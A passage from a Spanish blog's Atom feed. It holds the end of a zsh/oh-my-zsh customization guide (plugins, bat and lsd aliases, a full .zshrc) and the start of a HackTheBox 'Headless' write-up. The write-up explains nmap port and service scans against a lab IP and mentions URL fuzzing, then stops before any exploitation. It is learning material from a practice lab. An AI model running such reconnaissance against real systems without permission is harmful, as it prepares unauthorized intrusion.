      <li>Para modificar el tema se usa:
        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  p10k configure
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<h2 id="instalación-de-plugins">Instalación de plugins</h2>
<p>Hay dos plugin muy usados cuáles son:</p>
<ul>
  <li>zsh-autosuggestions
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/zsh-users/zsh-autosuggestions <span class="k">${</span><span class="nv">ZSH_CUSTOM</span><span class="k">:-</span><span class="p">~/.oh-my-zsh/custom</span><span class="k">}</span>/plugins/zsh-autosuggestions
</code></pre></div>    </div>
  </li>
  <li>zsh-syntax-highlighting
    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="k">${</span><span class="nv">ZSH_CUSTOM</span><span class="k">:-</span><span class="p">~/.oh-my-zsh/custom</span><span class="k">}</span>/plugins/zsh-syntax-highlighting 
</code></pre></div>    </div>
  </li>
</ul>

<p>En el archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> se modificará lo siguiente:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">plugins</span><span class="o">=(</span>git
    zsh-autosuggestions
    zsh-syntax-highlighting 
<span class="o">)</span>
</code></pre></div></div>

<h2 id="alias-de-bat">Alias de bat</h2>
<p>En este caso se utiliza la herramienta <a href="https://github.com/sharkdp/bat">bat</a> la cual tiene una función parecida al comando cat, sin embargo, este tiene una presentación más elegante y más visual, por lo cual se opta por modificar el comando cat usando el alias en <code class="language-plaintext highlighter-rouge">.zshrc</code></p>

<p>Para la instalación de esta herramienta se puede instalar con el siguiente comando.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>bat
</code></pre></div></div>
<p>o bien se puede descargar la <a href="https://github.com/sharkdp/bat/releases/tag/v0.24.0">última versión</a> para ello se instala de la siguiente manera.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install</span> ./nombre_del_archivo.deb
</code></pre></div></div>
<p>Dentro del archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> se agrega el siguiente alias:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias cat</span><span class="o">=</span><span class="s1">'/bin/bat'</span>
<span class="nb">alias </span><span class="nv">catn</span><span class="o">=</span><span class="s1">'/bin/cat'</span>
<span class="nb">alias  </span><span class="nv">catln</span><span class="o">=</span><span class="s1">'/bin/bat --paging=never'</span>
</code></pre></div></div>
<p>Así es como se ve nuestra terminal usando esta herramienta:</p>
<p align="center">
<img src="/assets/images/PersonalizacionLinux/batcat.png" />
</p>
<p>En algunos casos se necesita copiar cosas de la terminal, así que para eso se configuró otro alias como catn</p>
<p align="center">
<img src="/assets/images/PersonalizacionLinux/batcat2.png" />
</p>

<h2 id="alias-de-lsb">Alias de lsb</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias ls</span><span class="o">=</span><span class="s1">'lsd'</span>
<span class="nb">alias </span><span class="nv">l</span><span class="o">=</span><span class="s1">'ls -l'</span>
<span class="nb">alias </span><span class="nv">la</span><span class="o">=</span><span class="s1">'ls -a'</span>
<span class="nb">alias </span><span class="nv">lla</span><span class="o">=</span><span class="s1">'ls -la'</span>
<span class="nb">alias </span><span class="nv">lt</span><span class="o">=</span><span class="s1">'ls --tree'</span>
</code></pre></div></div>

<h2 id="configuración-personal-de-zshrc">Configuración personal de .zshrc</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">if</span> <span class="o">[[</span> <span class="nt">-r</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CACHE_HOME</span><span class="k">:-</span><span class="nv">$HOME</span><span class="p">/.cache</span><span class="k">}</span><span class="s2">/p10k-instant-prompt-</span><span class="k">${</span><span class="p">(%)</span><span class="k">:-</span><span class="p">%n</span><span class="k">}</span><span class="s2">.zsh"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">source</span> <span class="s2">"</span><span class="k">${</span><span class="nv">XDG_CACHE_HOME</span><span class="k">:-</span><span class="nv">$HOME</span><span class="p">/.cache</span><span class="k">}</span><span class="s2">/p10k-instant-prompt-</span><span class="k">${</span><span class="p">(%)</span><span class="k">:-</span><span class="p">%n</span><span class="k">}</span><span class="s2">.zsh"</span>
<span class="k">fi

</span><span class="nb">export </span><span class="nv">ZSH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.oh-my-zsh"</span>

<span class="nv">ZSH_THEME</span><span class="o">=</span><span class="s2">"powerlevel10k/powerlevel10k"</span>

<span class="c">#alias </span>
<span class="nb">alias cat</span><span class="o">=</span><span class="s1">'/bin/bat'</span>
<span class="nb">alias </span><span class="nv">catn</span><span class="o">=</span><span class="s1">'/bin/cat'</span>
<span class="nb">alias  </span><span class="nv">catln</span><span class="o">=</span><span class="s1">'/bin/bat --paging=never'</span>

<span class="nv">plugins</span><span class="o">=(</span>git
	zsh-autosuggestions
	zsh-syntax-highlighting 
<span class="o">)</span>

<span class="nb">source</span> <span class="nv">$ZSH</span>/oh-my-zsh.sh

<span class="c"># User configuration</span>
<span class="nv">ZSH_HIGHLIGHT_HIGHLIGHTERS</span><span class="o">=(</span>main brackets pattern cursor<span class="o">)</span>
ZSH_HIGHLIGHT_STYLES[command]<span class="o">=</span><span class="s1">'fg=blue,bold'</span>
ZSH_HIGHLIGHT_STYLES[builtin]<span class="o">=</span><span class="s1">'fg=green,bold'</span>

<span class="c"># Example aliases</span>
<span class="c"># alias zshconfig="mate ~/.zshrc"</span>
<span class="c"># alias ohmyzsh="mate ~/.oh-my-zsh"</span>
<span class="nb">alias ls</span><span class="o">=</span><span class="s1">'lsd'</span>
<span class="nb">alias </span><span class="nv">l</span><span class="o">=</span><span class="s1">'ls -l'</span>
<span class="nb">alias </span><span class="nv">la</span><span class="o">=</span><span class="s1">'ls -a'</span>
<span class="nb">alias </span><span class="nv">lla</span><span class="o">=</span><span class="s1">'ls -la'</span>
<span class="nb">alias </span><span class="nv">lt</span><span class="o">=</span><span class="s1">'ls --tree'</span>

<span class="c"># To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.</span>
<span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> ~/.p10k.zsh <span class="o">]]</span> <span class="o">||</span> <span class="nb">source</span> ~/.p10k.zsh


<span class="nb">eval</span> <span class="s2">"</span><span class="si">$(</span>/home/linuxbrew/.linuxbrew/bin/brew shellenv<span class="si">)</span><span class="s2">"</span>
<span class="c"># Instalar gemas en ~/.gem</span>
<span class="nb">export </span><span class="nv">GEM_HOME</span><span class="o">=</span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.gem"</span>
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$HOME</span><span class="s2">/.gem/bin:</span><span class="nv">$PATH</span><span class="s2">"</span>
</code></pre></div></div>]]></content><author><name>Eduardo Rivera</name></author><category term="Linux" /><category term="Linux" /><category term="Personalización" /><summary type="html"><![CDATA[En este post es mi personalización personal de un sistema operativo Linux de las herramientas más usadas y las más cómodas.]]></summary></entry><entry><title type="html">Máquina Headless de HackTheBox con dificultad fácil</title><link href="http://localhost:4000/hackthebox/Maquina-Headless/" rel="alternate" type="text/html" title="Máquina Headless de HackTheBox con dificultad fácil" /><published>2024-06-30T00:00:00-06:00</published><updated>2024-06-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/Maquina-Headless</id><content type="html" xml:base="http://localhost:4000/hackthebox/Maquina-Headless/"><![CDATA[<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.001.png" />
</p>

<p>En esta máquina primero que nada se tuvo que hacer un análisis para poder obtener información sobre los puertos que estaba abierto para ello se llevó a cabo el uso NMAP, en el cual se hace con el siguiente comando:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-vvv</span> –min-rate 5000 <span class="nt">-n</span> 10.10.11.8 
</code></pre></div></div>

<ul>
  <li>
    <p><strong>-p-</strong>: Este parámetro indica que Nmap debe escanear todos los puertos, del 1 al 65535. Normalmente, Nmap escanea solo los 1000 puertos más comunes si no se especifica ningún rango de puertos.</p>
  </li>
  <li>
    <p><strong>-sC</strong>: Este parámetro habilita el uso de los scripts Nmap Scripting Engine (NSE) con la opción de script predeterminado. Los scripts NSE pueden realizar una variedad de tareas, como la detección de versiones de servicios y la identificación de vulnerabilidades.</p>
  </li>
  <li>
    <p><strong>-vvv</strong>: Este parámetro aumenta la verbosidad del escaneo, proporcionando información detallada sobre el progreso del escaneo y los resultados. Cuantos más “v” se añadan, más detallada será la salida.</p>
  </li>
  <li>
    <p><strong>–-min-rate 5000</strong>: Este parámetro establece la tasa mínima de paquetes por segundo que Nmap debería enviar, en este caso, 5000 paquetes por segundo. Esto hace que el escaneo sea más rápido, pero puede generar tráfico de red considerable y posiblemente ser detectado como un comportamiento sospechoso por sistemas de detección de intrusos (IDS).</p>
  </li>
  <li>
    <p><strong>-n</strong>: Este parámetro deshabilita la resolución de nombres de dominio inversa. Esto significa que Nmap no intentará resolver direcciones IP a nombres de host, lo que puede acelerar el escaneo.</p>
  </li>
</ul>

<p><strong>Resultados obtenidos:</strong></p>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.002.png" />
</p>

<p>En la captura podemos ver que solo tenemos abiertos dos puertos el cual uno es el puerto 22 y el otro el 5000, cual sabemos las siguientes características:</p>

<p><strong>Puerto 22</strong></p>

<ul>
  <li><strong>Protocolo:</strong> TCP</li>
  <li><strong>Servicio común:</strong> SSH (Secure Shell)</li>
  <li><a name="_int_ahikk2d5"></a><strong>Uso principal:</strong> El puerto 22 es conocido por el protocolo SSH, que proporciona una forma segura de conectarse a otro ordenador a través de una red no segura. SSH permite el acceso remoto a servidores, la transferencia segura de archivos mediante SCP (Secure Copy) y SFTP (SSH File Transfer Protocol), así como la ejecución remota de comandos. SSH es esencial en la administración de sistemas y servidores, especialmente en entornos Linux y Unix.</li>
</ul>

<p><strong>Puerto 5000</strong></p>

<ul>
  <li><strong>Protocolo:</strong> TCP/UDP</li>
  <li><strong>Servicios comunes:</strong>
    <ul>
      <li><strong>UPnP (Universal Plug and Play):</strong> Este protocolo, utilizado principalmente en redes domésticas, permite que dispositivos en una red se descubran y se comuniquen automáticamente entre sí. UPnP facilita la configuración de redes y la conectividad entre dispositivos sin intervención manual significativa.</li>
      <li><strong>Docker:</strong> En el contexto de Docker, un sistema de contenedores de aplicaciones, el puerto 5000 se usa comúnmente como el puerto predeterminado para el registro privado de Docker (Docker Registry). Un Docker Registry es un repositorio para almacenar y distribuir imágenes Docker.</li>
      <li><strong>Flask:</strong> En el desarrollo web con Python, el marco Flask puede usar el puerto 5000 como su puerto predeterminado para ejecutar aplicaciones web durante el desarrollo.</li>
    </ul>
  </li>
  <li><strong>Uso principal:</strong> Dado que el puerto 5000 no está asignado de manera oficial a un servicio específico por la IANA (Internet Assigned Numbers Authority), puede ser utilizado por diferentes aplicaciones y servicios según las necesidades de los usuarios y desarrolladores. Sin embargo, los usos mencionados arriba son algunos de los más comunes.</li>
</ul>

<p>A continuación, procedemos a obtener más información de los puertos usando nmap esto se hace principalmente para que no se demore demasiado tiempo en obtener la información:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p22</span>,5000 <span class="nt">-A</span> <span class="nt">-Pn</span> <span class="nt">-vvv</span> 10.10.11.8
</code></pre></div></div>

<ul>
  <li><strong>-p22,5000</strong>: Esta opción especifica los puertos que deseas escanear. En este caso, Nmap escaneará los puertos 22 (usualmente usado por SSH) y 5000. Puedes especificar un rango de puertos o una lista separada por comas.</li>
  <li><strong>-A</strong>: Esta opción activa la detección avanzada. Incluirá:
    <ol>
      <li>Detección de sistema operativo.</li>
      <li>Detección de versión de servicio.</li>
      <li>Escaneo de scripts.</li>
      <li>Rastreo de ruta (traceroute).</li>
    </ol>
  </li>
  <li><strong>-Pn</strong>: Esta opción le dice a Nmap que no haga un “ping” previo a los hosts para ver si están activos. Por defecto, Nmap hace un ping para determinar si un host está activo antes de escanearlo. Con -Pn, Nmap escaneará los puertos incluso si el host no responde a los pings.</li>
</ul>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.005.png" />
</p>

<p>En esta captura podemos ver algo interesante, primero que nada, podemos ver que en el puerto 22 si bien nos muestra la versión en el cual está trabajando el problema radica que no hay vulnerabilidad aparente, es decir si va al internet no hay ningún tipo de exploit que se puede usar para conectarse, así que el único puerto que queda disponible es el 5000 sin embargo este solo se usa para alojar el acceso a la página web así que no hay manera de explotar una vulnerabilidad.</p>

<p>Solo queda ingresar a la página:</p>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.004.png" />
</p>

<p>En este caso procedemos a buscar páginas que puedan estar ocultas apartir de la URL, para eso usamos FUZZ</p>

<p align="center">
<img src="/assets/images/MaquinaHeadless/Aspose.Words.c51fa9d9-6a10-477b-b35c-8f7240e81596.003.png" />
</p>]]></content><author><name>Eduardo Rivera</name></author><category term="HackTheBox" /><category term="puerto 5000" /><category term="nmap" /><summary type="html"><![CDATA[Abordando el desafío de la máquina Headless en HackTheBox: una intrigante aventura que, aunque aparentemente sencilla, esconde múltiples desafíos y lecciones clave.]]></summary></entry></feed>